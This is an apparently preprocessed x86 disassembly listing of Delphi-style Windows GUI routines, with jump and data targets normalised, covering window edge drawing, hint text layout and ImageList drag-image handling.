mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403324
jmp r-xdata
sub_4504ec
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x163 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x163 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44a198
retn
cmp cl [ eax + 0x164 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x164 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44a198
sub_450530
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x162 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x162 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_44a198
sub_450580
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_450610
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_450876
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_424a6c
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_43c760
call sub_43c840
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_43c760
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_43cf8c
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_4508b8
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406b7c
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_448af0
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_44d0c4
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_44a198
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_44b35c
sub_450924
push ebx
push esi
mov esi edx
call sub_4607d8
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_406ae8
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_44a198
jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_406ae8
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_44a198
add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_450988
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_44d48c
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_4509c0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4509b8
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_450a00
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_448084
mov dl 0x1
mov eax [ r-xdata ]
call sub_424c18
mov esi eax
mov [ ebx + 0x160 ] esi
mov eax esi
mov edx ebx
call sub_447b60
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_450a5c
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44815c
test bl bl
jle r-xdata
xor eax eax
call sub_446150
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_450a9c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_424f1c
xor eax eax
push ebp
push sub_450b37
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_425300
xor eax eax
push ebp
push sub_450b14
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450b1b
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor edx edx
call sub_425300
retn
sub_450b48
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_451480
mov edx 0x80ffff
mov eax esi
call sub_44914c
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_42517c
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_424b54
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_450bb4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44c664
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40c02c
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_44c5fc
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_450c20
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_450c76
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450c7d
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call ReleaseDC
retn
sub_450c84
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_450d1d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_42426c
mov eax ebx
call sub_44b304
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_448fac
mov eax [ ebp - 0x14 ]
call sub_404378
push eax
mov eax [ ebx + 0x208 ]
call sub_425280
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450d24
lea eax [ ebp - 0x14 ]
call sub_403eb8
retn
sub_450d2c
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_450d98
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_450e23
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450e2a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403edc
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_448fac
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_4250bc
mov edx eax
add edx 0x6
mov eax esi
call sub_448740
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_448fac
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_4250d8
mov edx eax
add edx 0x4
mov eax esi
call sub_448764
sub_450e30
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_451009
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_448fdc
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_44a23c
mov eax [ esi ]
call sub_467010
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_46701c
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_467010
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_467004
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_46701c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_466ff8
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_467004
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_466ff8
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_44cf0c
push 0x4
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451010
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_404178
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_4540c8
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call [ rw-data ]
sub_451018
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_451040
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_4170c4
mov eax esi
call sub_44b304
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_404378
push eax
mov eax [ esi + 0x208 ]
call sub_425280
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_45109c
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_4170c4
call sub_43c760
call sub_43c840
test al al
jne r-xdata
call sub_43c760
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_43cc00
push esp
push 0x1
push 0xf
push 0x0
call sub_43c760
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_43c900
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_451108
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_44d814
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_45112c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_451184
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_451244
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46752c
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42be3c
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46752c
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42be3c
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_451250
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_4566e0
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_4568b4
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4512b0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_457590
mov eax ebx
call sub_4566e0
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x6a ] 0x0
je r-xdata
push esi
push 0x0
call ImageList_GetDragImage
sub_4512dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_4566e0
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_451184
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_45133c
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_451250
push 0x0
call ShowCursor
sub_45133c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_4566e0
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_4513a0
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_45112c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_4513a0
push ebx
mov ebx eax
mov eax ebx
call sub_4566e0
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_4513c4
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_4566e0
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_45112c
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_451438
push ebx
push esi
mov esi eax
mov eax esi
call sub_4566e0
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_4513a0
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_451298
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_451480
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44b4f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_424c18
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_447b60
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_4514dc
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44b628
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_45152c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_424f1c
xor eax eax
push ebp
push sub_4515ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_425300
xor eax eax
push ebp
push sub_4515a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_447b78
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4515ae
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_425300
retn
sub_4515dc
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_451670
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_4515f8
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_451670
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_451c68
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_451670
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_4516a4
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
